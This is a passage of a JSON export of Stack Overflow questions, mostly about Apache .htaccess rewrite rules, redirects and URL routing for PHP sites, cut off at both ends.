directives?</p>\n"},{"tags":["php",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":47,"score":-2,"question_id":12851913,"title":"htaccess: redirect from a specific link to a webpage","body":"<p>I've asked a similar question 5 days ago, but this one is more specific.. i hope it's ok...</p>\n\n<p>someone has put a link on their webpage to my web page forum, and i want to redirect to another web page when that link is clicked...</p>\n\n<p>The link could appear anywhere on their site, for the purpose of this question, let's say </p>\n\n<pre><code>http://www.otherwebpage.com/\n</code></pre>\n\n<p>or ir could be</p>\n\n<pre><code>http://www.otherwebpage.com/section1.php\n</code></pre>\n\n<p>or </p>\n\n<pre><code>http://www.otherwebpage.com/links.html\n</code></pre>\n\n<p>and the link is:</p>\n\n<p><a href=\"http://www.thelink.com/forum\" rel=\"nofollow\">http://www.thelink.com/forum</a></p>\n\n<p>So, in other words, when someone clicks on <a href=\"http://www.thelink.com/forum\" rel=\"nofollow\">http://www.thelink.com/forum</a> on their webpage i want to redirect to , let's say, <a href=\"http://www.cnn.com\" rel=\"nofollow\">http://www.cnn.com</a></p>\n\n<p>i've manage to create something on my .htaccess file that works, but not as i want it to work...</p>\n\n<pre><code>RewriteCond %{HTTP_REFERER} ^http://www\\.otherwebpage\\.com/ [NC]\nRewriteRule ^(.*) http://www\\.cnn\\.com [L]\n</code></pre>\n\n<p>Any ideas how?</p>\n"},{"tags":[".htaccess","redirect","links"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":37,"score":2,"question_id":12851818,"title":"how to make several redirection","body":"<p>Right now I am updating my web site and I want to change all links to non-extension links like <code>example.com/test.php</code> to <code>example.com/test</code>. THis solution I found I put in  .htaccess file: </p>\n\n<pre><code>RewriteCond %{THE_REQUEST} ^GET\\ /(([^/?]*/)*[^/?]+)\\.php\n\nRewriteRule ^.+\\.php$ /%1 [L,R=301]\n</code></pre>\n\n<p>But at the same time I need to make redirection for links what located in lower level of my web-site like <code>example.com/level/test2.php</code> to <code>example.com/test2.php</code>.\nWhat should I write in .htaccess to redirect my files from lower level to higher and remove .php extension at the same time?</p>\n"},{"tags":[".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12851131,"title":"Comma to hyphen .htaccess URL Rewrite","body":"<p><strong>How can I EDIT the following .htaccess file to seperate the link seperator from comma to hyphen?</strong></p>\n\n<p><code>\n    RewriteEngine On</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} ^(.*)//(.*)$\nRewriteRule . %1/%2 [R=301,L]\n\nRewriteRule ^(.*),(.*)$ $2.php?rewrite_params=$1&amp;page_url=$2\n\nRewriteCond %{QUERY_STRING} base64_encode.*(.*) [OR] \nRewriteCond %{QUERY_STRING} (&lt;|%3C).*script.*(&gt;|%3E) [NC,OR] \nRewriteCond %{QUERY_STRING} GLOBALS(=|[|%[0-9A-Z]{0,2}) [OR] \nRewriteCond %{QUERY_STRING} _REQUEST(=|[|%[0-9A-Z]{0,2}) \nRewriteRule ^(.*)$ index.php [F,L]\n</code></pre>\n\n<p></code></p>\n\n<p>URL EXAMPLE: website.ca/store/goldmart/watch,name,14,store_id,store_details</p>\n\n<p><strong>Thanks for any help! Eh.</strong></p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12851066,"title":"htaccess mod-rewrite file name, how to format the regex","body":"<p>I have a directory in my root called images. I have a naming convention of number-category.jpg. I am using this convention through a PHP script and would like to have a RewriteRule in my htaccess that does something to the effect of word-word-category-number.jpg for SEO purposes.  </p>\n\n<p>So what was once '<code>10-abstract.jpg</code>' is now '<code>fine-art-abstract-art-10.jpg</code>'</p>\n\n<p>I was reading some tutorials and came up with below with no success:</p>\n\n<pre><code>RewriteRule ^([0-9]-[a-z])-art.jpg$ /2/art/$1-$2.jpg [L]\n</code></pre>\n"},{"tags":["php","apache",".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12850847,"title":"Redirect example.com/out/1234 to another URL","body":"<p>I know theres a lot of posts about redirects but this is a little different (I think).</p>\n\n<p>Basically I want my outlinks to be example.com/out/1234 and I want them to go to a php that looks up the URL 1234 if referenced to in MySQL and the php header redirect to that URL.</p>\n\n<p>The problem Im having is passing 1234 to a page. I know how if it was out.php?q=1234 but I want it to be /out/1234</p>\n\n<p>Does there need to be an index file within an /out directory that also has a htaccess to rewrite it?</p>\n\n<p>If so, any ideas what the regex need to be to do this? I have seen a few sites doing this and I cant work it out.</p>\n"},{"tags":["php",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":12849247,"title":".htaccess redirect to subdomain on port 8000 without changing URL?","body":"<p>We have a map application hosted on a subdomain of our site which we want to be able to access from the URL <a href=\"http://www.example.com/map/\" rel=\"nofollow\">http://www.example.com/map/</a></p>\n\n<p>The problem is that the subdomain is hosted on a different server, and the map application is on port 8000. </p>\n\n<p>Is there any way to redirect to the map application from <code>/map/</code> on our main domain, without the URL changing, using either .htaccess or PHP?</p>\n\n<p>Also, I don't have access to the server the map application is hosted on.</p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12850022,"title":"Allow a script to execute inside cms","body":"<p>I have a site setup and working well based in Silverstripe cms. I created a php script (not a plugin) that does some file conversion. I uploaded the script to the site root, and created an .htaccess inside it with \"Allow from all\", and I give 777 to folder permission in order to allow access to this script from a browser. However, the site's \"page not found\" page shows up instead.</p>\n\n<p>Can someone explain what I'm missing here?\nthis is some conditionals in htaccess file:</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} !(\\.gif)|(\\.jpg)|(\\.png)|(\\.css)|(\\.js)|(\\.php)$\nRewriteCond %{REQUEST_URI} ^(.*)$\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule .* sapphire/main.php?url=%1&amp;%{QUERY_STRING} [L]\n</code></pre>\n\n<p>here is the current htaccess file:</p>\n\n<pre><code>Options +FollowSymlinks \n### SILVERSTRIPE START ### \n&lt;IfModule mod_dir.c&gt; DirectorySlash Off &lt;/IfModule&gt; \nRewriteEngine On RewriteBase / RewriteRule ^index.html$ http://www.domain.com/ [R=301,L] RewriteCond %{REQUEST_URI} !(\\.gif)|(\\.jpg)|(\\.png)|(\\.css)|(\\.js)|(\\.php)$ \nRewriteCond %{REQUEST_URI} ^(.*)$ \nRewriteCond %{REQUEST_URI} !^/csv_compare \nRewriteCond %{REQUEST_FILENAME} !-f \nRewriteRule .* sapphire/main.php?url=%1&amp;%{QUERY_STRING} [L] \n### SILVERSTRIPE END ###\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12849703,"title":"Reset htacces for sub-folders","body":"<p>I have a htacces file in my root folder with some basic code in it. But I want that all those instructions get ignored in the directory \"voxelforum.com\". How can I achive this?</p>\n\n<p>Thanks!</p>\n"},{"tags":["svn",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":11718344,"title":"unable to checkout the .htaccess from svn","body":"<p>I am not able to understand .htaccess behavior.</p>\n\n<p>I have committed .htaccess in the folder but when I checkout on localhost machine,...htaccess do not appear hence my site doesn't work.</p>\n\n<p>I forcefully deleted and checked in again but still no show on local machine !.</p>\n\n<p>I have another branch with the same svn propset and it is working from my previous branch..</p>\n\n<p>Any idea ?? whats wrong? </p>\n\n<p>Req: I would like to checkout the latest code including .htaccess</p>\n\n<p>Any assistance would be great help.</p>\n"},{"tags":[".htaccess","cakephp","routing"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":181,"score":2,"question_id":10404892,"title":".htaccess is not working by my desires with CakePHP","body":"<p>There is /localhost/domains/localhost/myCakephpApp on web server. I can't do anything with folder structure, but I can edit .htaccess in /localhost/, which now simplified looks like this:</p>\n\n<pre><code>RewriteRule (.*) /domains/localhost/$1 [L]\n</code></pre>\n\n<p>My website in localhost/domains/localhost/myCakephpApp has standard cake .htaccess file:</p>\n\n<pre><code>RewriteRule    ^$ app/webroot/    [L]\nRewriteRule    (.*) app/webroot/$1 [L]\n</code></pre>\n\n<p>It is nice that <a href=\"http://localhost/whatever/\" rel=\"nofollow\">http://localhost/whatever/</a> works, but all links in cakephp (done with html helper) are pointing to <a href=\"http://localhost/domains/localhost/whatever/\" rel=\"nofollow\">http://localhost/domains/localhost/whatever/</a> and it is accessible.</p>\n\n<p>What should I do to make the website running only on <a href=\"http://localhost/\" rel=\"nofollow\">http://localhost/</a> and not on <a href=\"http://localhost/domains/localhost/\" rel=\"nofollow\">http://localhost/domains/localhost/</a>?</p>\n\n<p>EDIT:</p>\n\n<p>Okay, I have modified the .htaccess in root (http://localhost/):</p>\n\n<pre><code>RewriteRule ^$ /domains/localhost/app/webroot/ [L]\nRewriteRule (.*) /domains/localhost/app/webroot/$1 [L]\n</code></pre>\n\n<p>and deleted one in <a href=\"http://localhost/domains/localhost/\" rel=\"nofollow\">http://localhost/domains/localhost/</a> which means that the web is only accessible from <a href=\"http://localhost\" rel=\"nofollow\">http://localhost</a>, but links are still pointing at <a href=\"http://localhost/domains/localhost/whatever\" rel=\"nofollow\">http://localhost/domains/localhost/whatever</a> (e404)</p>\n\n<p>Is there something in cake's routing like \"base url\"? I have searched a lot, but nothing worked.</p>\n"},{"tags":["apache",".htaccess","httpd"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12834640,"title":"Why my htaccess rule is not working unless it's directed to a PHP file","body":"<p>My htaccess file is under \"myappname\" folder.</p>\n\n<p>I'm trying to redirect this path;</p>\n\n<pre><code>myappname/CONTROLLER_NAME/ANYFILE.(css|js|gif|jpg|png)\n</code></pre>\n\n<p>To that path</p>\n\n<pre><code>myappname/views/default/tpl/CONTROLLER_NAME/ANYFILE.(css|js|gif|jpg|png)\n</code></pre>\n\n<p>and this is my HTACCESS rule </p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^(.*)/(.*)\\.(css|js|gif|jpg|png)$ views/default/tpl/$1/$2.$3 [L,NC]\n</code></pre>\n\n<p>but it's giving me HTTP 500 unless I redirect it to a PHP file like </p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^(.*)/(.*)\\.(css|js|gif|jpg|png)$ views/default/tpl/$1/index.php?a=$2.$3 [L,NC]\n</code></pre>\n\n<p>What is wrong with my rule? I'm very new to htaccess and there is a very big potential to I'm missing something small. </p>\n"},{"tags":["php","apache",".htaccess","lamp"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12828163,"title":"Why are my php tags converted to html comments?","body":"<p>I'm sure there's a simple explanation...</p>\n\n<p>While playing around with a friends (lamp) hosting set for the first time today, I tried to execute some php, but it doesn't seem to be working.</p>\n\n<p>In Chrome's inspect element, </p>\n\n<pre><code>&lt;?php echo 'test'; ?&gt; \n</code></pre>\n\n<p>becomes </p>\n\n<pre><code>&lt;!--?php echo 'test'; ?--&gt;\n</code></pre>\n\n<p>Furthermore, its been triggering a download of the file, rather than trying to open it as a webpage.</p>\n\n<p>I've tried some code in an <code>.htaccess</code> file, but it doesn't seem to have any effect:</p>\n\n<pre><code>AddType x-mapp-php5 .php\nAddType application/x-httpd-php .php\nAddHandler x-mapp-php5 .php\n</code></pre>\n"},{"tags":[".htaccess","for-loop","call"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12839524,"title":"Do I need to call for .htaccess?","body":"<p>I have no experience with .htaccess, but I got a tip that it's very useful so I wanted to try this.</p>\n\n<p>I now have a file called .htaccess, in my root folder.\nThe files contains this;</p>\n\n<pre><code>RewriteBase /\n\nRewriteEngine on\nRewriteCond %{HTTP_HOST} ^kellyvuijst\\.nl [nc]\nRewriteRule (.*) http://www.kellyvuijst.nl/$1 [R=301,L]\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.html -f\nRewriteRule ^([^/]+)/$ $1.html \nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_URI} !(\\.[a-zA-Z0-9]{1,5}|/)$\nRewriteRule (.*)$ /$1/ [R=301,L]\n</code></pre>\n\n<p>What I'm trying to do here is create a 'www.mysite.com/portfolio/' instead of 'mysite.com/portfolio.html' I used some tutorials on this and I think it's correct, but I'm not sure.</p>\n\n<p>So now I have this file, and what now? The tutorials all show what to put in the file but not what to do with it? Do I need to call for it in every .html page I have? And how do I call for it?</p>\n"},{"tags":["apache",".htaccess","redirect","url-rewriting","catch-all"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12843978,"title":"htaccess redirect catchall","body":"<p>I need to redirect a directory, and all subdirectories and files in that directory, to the same location (root). So anyone who tries to visit <code>/old</code>, <code>/old/folder</code>, <code>/old/other-folder/xy/page.php</code>, or anywhere else within the 'old' folder, should be redirected to the root domain.</p>\n\n<p>So far, I have this:</p>\n\n<pre><code>Redirect 301 ^/old/.*$ /\n</code></pre>\n\n<p>Is this the best way of doing it, or would it be better to use <code>(.*)</code> instead of <code>.*</code>? What is the difference between the two?</p>\n\n<p>Or - should I use a RewriteRule instead of a Redirect like above? If so, why?</p>\n\n<p>Thank you!</p>\n"},{"tags":[".htaccess","codeigniter"],"answer_count":7,"favorite_count":10,"up_vote_count":7,"down_vote_count":0,"view_count":16914,"score":7,"question_id":1397014,"title":"How do I write a .htaccess file to make CodeIgniters URL routing work?","body":"<p>I'm running a LAMP environment with CodeIgniter. I want to be able to use its URL pattern, like, <code>http://localhost/controller/function/ID</code>, but by default it has to be <code>http://localhost/index.php/controller/function/ID</code>. The user guide says that I need a .htaccess file to make the former style possible, and uses this as an example:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(index\\.php|images|robots\\.txt)\nRewriteRule ^(.*)$ /index.php/$1 [L]\n</code></pre>\n\n<p>But I don't understand how this works. Where should I put the .htaccess? Does it have to be in the server root?</p>\n\n<p>What if I have multiple sites running on my server. Do I have to put it in <code>/var/www/</code> and specify conditions based on what directories are loaded? Or can I just put it in <code>/var/www/site_using_codeigniter/</code>? I'm not sure how to even get this to work.</p>\n\n<p>Can I make it so that it will only map to an MVC URL if the requested URL doesn't actually exist? For example, <code>http://localhost/articles/2009/some-article-name</code> wouldn't be a directory on the server, so it would map to <code>index.php</code> and be given to codeigniter, but <code>http://localhost/forum</code> <em>would</em> exist on the server but shouldn't be handled by codeigniter.</p>\n\n<p>Any other things I should do with a .htaccess file? Anything good to read about them?</p>\n\n<h2>update</h2>\n\n<p>I changed my config file like this:</p>\n\n<pre><code>$config['index_page'] = \"\"; //used to be \"index.php\"\n</code></pre>\n\n<p>and added this to a <code>.htaccess</code> file:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(index\\.php|images|robots\\.txt)\nRewriteRule ^(.*)$ /index.php/$1 [L]\n</code></pre>\n\n<p>and saved it in my sites root directory (in this case <code>/var/www/cms/</code>)</p>\n\n<p>I went into /etc/apache2/conf.d/security (which is included by /etc/apache2/apache2.conf) and did this:</p>\n\n<pre><code>&lt;Directory /&gt;\n    AllowOverride All #was \"none\", but this was all commented out\n    Order Deny,Allow\n    Deny from all\n&lt;/Directory&gt;\n</code></pre>\n\n<p>It's still not working however. If I navigate to <code>http://localhost/cms/index.php/hello</code>, it prints \"Hello there,\" but <code>http://localhost/cms/hello</code> gives a 404 error.</p>\n\n<p>Ideas?</p>\n\n<h2>update: græt success!</h2>\n\n<p>I had to dig through my apache configuration files to finally find where all the directories were defined (I had never messed around in server config files before this date) and found that pesky <code>AllowOverride None</code> that was foiling my plans for greatness.</p>\n\n<p>Now it works perfectly. All of the answers here are viable and work.</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12844300,"title":"How to redirect using .htaccess?","body":"<p>I need my site to redirect from this url:</p>\n\n<pre><code>mysite.com/old/dir/param1/param2/...\n</code></pre>\n\n<p>to</p>\n\n<pre><code>mysite.com/dir/param1/param2/...\n</code></pre>\n\n<p>I need to keep the params, just remove the \"old\" in the url.</p>\n\n<p>How can I add this rule to my .htaccess?</p>\n\n<p>Thanks!!!</p>\n\n<p>Here's my .htaccess:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n\nRewriteBase /\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteRule ^(.*)$ index.php?/$1 [QSA,L]\n\n    RewriteRule ^old/dir/(.*) mysite.com/dir/$1 [R=301,L]\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12824633,"title":"301 redirect, conflicting with RewriteRule","body":"<p>We did some maintenance today, and moved our web forums from /forums into the root folder of the domain. </p>\n\n<p>We put in a redirect 301 in a .htaccess file:</p>\n\n<pre><code>Redirect 301 /forums/ http://www.ourforums.com/\n</code></pre>\n\n<p>However, we used to have some links that contained duplicate /forums folders. I.e. www.ourforums.com/forums/forums/forum.1</p>\n\n<p>Obviously the redirect from above now leads to /forum.1, which odes not exist. I would like the old link to actually point to www.ourforums.com/boards/forum.1. I attempted to use something like:</p>\n\n<pre><code>RewriteRule ^/forums/forums http://www.ourforums.com/boards/ [NC,R=301,L]\n</code></pre>\n\n<p>Regardless of what I tried though, the Redirect seems to supersede any RewriteRules I put in the same file, regardless of whether I place them before the Redirect. </p>\n\n<p>Is there any way I can somehow ensure the RewriteRule is handled before the Redirect? </p>\n"},{"tags":["wordpress",".htaccess","mod-rewrite","url-rewriting"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":321,"score":0,"question_id":3468998,"title":"Is It Possible to Alter the Displayed URL from the Actual URL?","body":"<p>I posted a question the other day about how to change the displayed URL on a Wordpress-generated page, specifically from something like \"mysite.com/?cat=3\" to just \"mysite.com\".  I got a few replies that steered me towards doing some type of redirect with .htacess.  After some research and experimentation, I realized that it's not so much a redirect I need but just some way to alter the <em>displayed</em> URL in the browser.  </p>\n\n<p>Part of the challenge is that the page in question is dynamically generated by a combination of standard WP code, a WP event calendar plugin (the-events-calendar), and some custom code a developer added.  I've played around with permalinks and the category slug, but I can't get the desired result.</p>\n\n<p>The bigger question, I think, is: \"Is it possible for a web server to deliver, for example, 'xyz.com/somedir/somefile.php?withsomequerystring=yes' but instruct the browser to <em>show</em> the URL as 'xyz.com/pretty-url' ?\"</p>\n\n<p>Hackers seem to be able to do all sorts of evil things to make people think they're on one web page/site when they're actually somewhere else.  I would think what I'm asking is possible through htaccess/mod_rewrite, but I don't know how to achieve it.  I've been banging my head against the wall on this for several weeks, so I would be thrilled if anyone had a good suggestion.</p>\n\n<p>Thanks!</p>\n"},{"tags":["apache",".htaccess","logging","virtualhost"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12841870,"title":"Log a request when it uses the virtual host file or .htaccess file","body":"<p>I am having an issue with directoryIndex currently. I am trying to see if my .htaccess file and virtual hosts file are being hit correctly. Is there a way I can log something when a  request uses the .htaccess file or virtual hosts?</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":461,"score":2,"question_id":8985502,"title":".htaccess redirect to all IP's but mine","body":"<p>Basically, I am trying to work on the front end of a website, but I would like everyone else but myself to be redirected to a construction page if you like. I currently have:</p>\n\n<pre><code>redirect 301 /index.php http://www.domain.com/construction.php\n</code></pre>\n\n<p>While this works, it works to well, I would like to be able to still see the live site myself, is it possible to exclude everyone but my IP?</p>\n\n<p>Thanks again.</p>\n"},{"tags":[".htaccess",".htpasswd"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1796,"score":0,"question_id":4180508,"title":"problem protecting a directory using .htaccess","body":"<p>I have created a .htaccess and .htpasswd files, and stored them in the folder I want to protect and when I navigated to that folder, I was asked for the username and passowrd (stored in the .htpasswd file) after entering the username and password, I got a 500 Internal server error. I have used the files on both localhost (windows) and on a web server (linux I guess) both gave the same result mentioned.</p>\n\n<p>this is my .htaccess file:</p>\n\n<pre><code>&lt;Files ~ \"^\\.(htaccess|htpasswd)$\"&gt;\ndeny from all\n&lt;/Files&gt;\nAuthUserFile /.htpasswd\nAuthGroupFile /dev/null\nAuthName \"Please enter your ID and password\"\nAuthType Basic\nrequire valid-user \norder deny,allow\n</code></pre>\n"},{"tags":["php","apache","http",".htaccess","mod-rewrite"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":592,"score":2,"question_id":2188225,"title":"htaccess mod_rewrite","body":"<p>I'm trying to put something with this, whenever I go to a page like:</p>\n\n<blockquote>\n<pre><code>http://www.example.com/character.php?id=3\n</code></pre>\n</blockquote>\n\n<p>I want the mod rewrite to change it to:</p>\n\n<blockquote>\n<pre><code>http://www.example.com/character/Jim_Carrey\n</code></pre>\n</blockquote>\n\n<p>Which of course, the ID is the row of the character name...</p>\n\n<p>For that kind of example... I've tried to work with it, but don't seem to get most of the production of htaccess because I haven't worked with <code>.htaccess</code> a lot really.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","url-rewriting"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":389,"score":0,"question_id":2460851,"title":"Rewrite URL in PHP with mod_rewrite","body":"<p>The web server is Apache. I want to rewrite URL so a user won't know the actual directory. For example: \nThe original URL:  </p>\n\n<blockquote>\n<pre><code>http://www.example.com/en/piecework/piecework.php?piecework_id=11\n</code></pre>\n</blockquote>\n\n<p>Expected URL:  </p>\n\n<blockquote>\n<pre><code>http://piecework.example.com/en/11\n</code></pre>\n</blockquote>\n\n<p>How to achieve it with <a href=\"http://httpd.apache.org/docs/current/mod/mod_rewrite.html\" rel=\"nofollow\">mod_rewrite</a>?</p>\n"}]}
{"total":14527,"page":10,"pagesize":100,"questions":[{"tags":["php",".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":12835581,"title":".htaccess with mod_rewrite for PHP","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/2460851/rewrite-url-in-php-with-mod-rewrite\">Rewrite URL in PHP with mod_rewrite</a>  </p>\n</blockquote>\n\n\n\n<p>I'm developing a job portal for our local city and its been developed using PHP and MySQL. I have included various functionalists into that like search by city and search by experience level and search by industry type and finally by dates.</p>\n\n<p>I have an URL like this:</p>\n\n<pre><code>http://example.com/job_details.php?id=hj11&amp;location=Mumbai&amp;job=System+Administrator&amp;company=Exa+India+Pvt+Ltd       \n</code></pre>\n\n<p>I tried many ways to attain the end result what i expected. but its not happening for me..:-(</p>\n\n<p>I'm looking for something like this,</p>\n\n<pre><code>http://example.com/jobs-in-mumbai/Exa-India-Pvt-Ltd/\n</code></pre>\n"},{"tags":["php","apache",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12825260,"title":".htaccess file not working with certain servers","body":"<p>Hello and thank you for taking the time to help me solve my problem. I like to build all of my web projects using a simple MVC Framework I have created along my travels. I seem to be having a problem getting the <code>.htaccess</code> file to work correctly on specific servers. </p>\n\n<p>For example...</p>\n\n<p>If you go to:</p>\n\n<p><a href=\"http://thomsonbrothersindustries.com/northside/\" rel=\"nofollow\">http://thomsonbrothersindustries.com/northside/</a> and attempt to access a page (right now only \"About Us\" is functional - <a href=\"http://thomsonbrothersindustries.com/northside/about\" rel=\"nofollow\">http://thomsonbrothersindustries.com/northside/about</a>) but as you can see the \"about\" page just directs you to a <strong>404 Error</strong>.</p>\n\n<p>Now, if you go to: (the same site, but on a different server)</p>\n\n<p><a href=\"http://ericzdisposal.com/northside/\" rel=\"nofollow\">http://ericzdisposal.com/northside/</a></p>\n\n<p><a href=\"http://ericzdisposal.com/northside/about\" rel=\"nofollow\">http://ericzdisposal.com/northside/about</a></p>\n\n<p>everything works fine...</p>\n\n<p>Here is the .HTACCESS file:</p>\n\n<pre><code>RewriteEngine on\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n\nRewriteRule ^(.*)$ index.php?rt=$1 [L,QSA]\n</code></pre>\n\n<p>My privileges are limited on the server that is currently not working and I'm still working on getting better access to domain tools, but in the meantime I'm just trying to get a better idea of the problem and hoping there might be an easy fix in my future.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":12830465,"title":"RewriteRule 301 redirect for urls with multiple query strings","body":"<p>I have urls like:</p>\n\n<pre><code>siteurl.com/category.php?id=6&amp;name=internet\n</code></pre>\n\n<p>i want to make a 301 redirection to</p>\n\n<pre><code>siteurl.com/category/6/internet/\n</code></pre>\n\n<p>I tried without success:</p>\n\n<pre><code>RewriteRule ^category.php?id=([^&amp;]*)&amp;name=([^&amp;]*) /category/$1/$2/ [R=301,L]\n</code></pre>\n\n<p>More info about it: <a href=\"http://stackoverflow.com/questions/12827183/duplicated-content-on-google-htaccess-or-robots-txt\">Duplicated content on google. htaccess or robots.txt?</a></p>\n\n<p>Any help?</p>\n\n<hr>\n\n<p><strong>Xtra Edit;</strong> the page is also accessible via <code>siteurl.com/category.php?id=6</code> (witohut the name query). Whats the best way to deal with that? Redirect this kind of URL to the home page? If so, how can i do that?</p>\n"},{"tags":["php",".htaccess","upload","php.ini","suphp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12390999,"title":"upload script not working after enabling suphp","body":"<p>My php script that uploads files in my centos - apache server was working fine.\nToday I enabled suphp in server and after that script is not uploading any files.\nI was used \"php_flag register_globals on\" in .htaccess before. But I removed that line from \".htaccess\" in order to prevent 500 server error.\nPls help</p>\n"},{"tags":["php","apache",".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":12830859,"title":"mod_rewrite remove trailing slash is causing loops","body":"<p>I have a site using mod_rewrite to make pretty URLs ... everywhere I read the removing the trailing slash is good for SEO and therefore I went with the rule:</p>\n\n<pre><code>RewriteRule ^(.+)/$ /$1 [R=301,L]\n</code></pre>\n\n<p>I think the 301 redirect might impact performance but that's not my question...</p>\n\n<p>The thing is that removing the trailing slash is causing me a loop when I try to access the index.php of a EXISTING subdirectory like so: <a href=\"http://mysite.com/a-real/directory/\" rel=\"nofollow\">http://mysite.com/a-real/directory/</a></p>\n\n<p>To my understanding, mod_rewrite atempts to remove the trailing slash but in this case it wasn't suppose to.</p>\n\n<p>How can I fix this? I'm betting that's a fairly simple solution however beyond my knowledge.</p>\n"},{"tags":["apache",".htaccess","web","website","webserver"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":52,"score":-1,"question_id":12832860,"title":"how can i force URLs to be case sensitive","body":"<p>Say I have the domain mydomain.com, and what I want to do is force the browser to show MyDomain.com in the URL bar.  I have the following htaccess:</p>\n\n<pre><code># force all to MyDomain.com\nRewriteCond %{HTTP_HOST} !^www.MyDomain\nRewriteRule (.*) http://www.MyDomain.com/$1 [R=301,L]\n</code></pre>\n\n<p>But it doesn't work.  Are there any tricks/hacks that can be done to make the browser show a URL that isn't all lowercase?  Or is this just not possible to do?</p>\n"},{"tags":["php",".htaccess","zend-framework"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12827368,"title":"Infinite redirect loop with .htaccess","body":"<p>I'm using Zend Framework (not full version, just some components), but I'm having a little problem. I didn't develop the software that I'll give support. When I tried to install, the first page is redirecting until it breaks my server: <code>http://localhost/software/manager/index/index/index/index/index/index/index/index/index/index/index/index/index/index/index/index/index/index/index/index</code>...</p>\n\n<p>Well I looked at all the code and can't figure out what's wrong. Here's my code:</p>\n\n<p>.htaccess</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^.*$ - [NC,L]\nRewriteRule !\\.(js|ico|txt|gif|jpg|png|css)$ bootstrapClass.php [NC,L]\n\nRewriteCond %{REQUEST_URI} !^/public/\nRewriteRule ^(.*)$ public/$1 [L]\n\nphp_flag magic_quotes_gpc off\nphp_flag register_globals off\nphp_value session.auto_start 0\nOptions -Indexes\n</code></pre>\n\n<p><a href=\"http://pastebin.com/DTHrWJYn\" rel=\"nofollow\">http://pastebin.com/DTHrWJYn</a></p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12830985,"title":".htaccess to redirect URLs to the requested, canonical URL","body":"<p>I have a few crawl errors showing in Google Webmasters Tools where there are pages being requested with \"about:blank\" and \"div\" appended 